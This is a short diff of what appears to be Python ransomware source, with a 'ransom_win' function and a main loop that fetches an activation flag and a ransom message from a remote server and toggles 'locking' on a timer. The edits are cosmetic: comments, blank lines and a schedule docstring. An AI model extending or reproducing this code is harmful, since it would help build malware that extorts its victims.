@@ -58,6 +58,8 @@ def ransom_win():
 
 
 """ send requests each 15 seconds, start/stop locking"""
+
+
 def main():
     print("run")
     try:
@@ -73,7 +75,7 @@ def main():
     except:
         activation = get(final.active_field)
     try:
-        msg = (requests.get(getMsg)).text
+        msg = (requests.get(getMsg)).text  # current message
         replace(final.msg_field,msg)
     except:
         pass
@@ -106,7 +108,7 @@ def main():
 
 
 """
-schedules program to run each 10 seconds
+schedules program to run each 7 seconds
 """
 
 schedule.every(7).seconds.do(main)
